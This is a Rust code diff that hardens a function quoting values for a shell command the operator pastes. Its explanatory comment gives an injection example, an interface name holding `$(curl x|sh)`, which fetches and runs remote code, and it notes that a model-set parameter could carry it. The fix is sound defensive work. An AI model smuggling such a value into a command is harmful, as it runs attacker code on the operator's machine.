@@ -962,16 +962,37 @@ fn port_bpf(proto: &str, port: Option<u16>, host_clause: &Option<String>) -> Str
     out
 }
 
-/// Quote for a POSIX shell (and cmd.exe, for the values we produce) only when
-/// needed, so `-i lo0` stays bare and `-f "tcp port 8080"` gets its quotes.
-fn shell_word(value: &str) -> String {
+/// Quote a value for the shell the operator will paste this into, only when needed, so
+/// `-i lo0` stays bare and `-f 'tcp port 8080'` gets its quotes.
+///
+/// The interface name is a startup parameter the model (or an MCP client) can set, and it
+/// lands in a line the operator copies into a terminal. Double quotes left `$`, backticks
+/// and `\` live, so `lo$(curl x|sh)` rendered as `-i "lo$(curl x|sh)"` — paste-ready
+/// in the wrong sense. On POSIX shells a single-quoted word has no metacharacters at all;
+/// an embedded `'` is spelled `'\''`. cmd.exe has no safe quoting, so there the value is
+/// double-quoted and anything cmd would still interpret (`%`, `^`, `&`, `|`, `<`, `>`) is
+/// replaced by a placeholder that says so rather than guessed at.
+pub fn shell_word(value: &str) -> String {
     let plain = !value.is_empty()
         && value
             .chars()
             .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ',' | '='));
     if plain {
-        value.to_string()
-    } else {
-        format!("\"{}\"", value.replace('"', "\\\""))
+        return value.to_string();
     }
+    if cfg!(windows) {
+        if value
+            .chars()
+            .any(|c| matches!(c, '%' | '^' | '&' | '|' | '<' | '>' | '"') || c.is_control())
+        {
+            return "<value-not-representable-for-cmd.exe>".to_string();
+        }
+        return format!("\"{value}\"");
+    }
+    // Control characters cannot be made safe inside a terminal paste; a newline would end
+    // the command and run what follows.
+    if value.chars().any(char::is_control) {
+        return "<value-contains-control-characters>".to_string();
+    }
+    format!("'{}'", value.replace('\'', "'\\''"))
 }
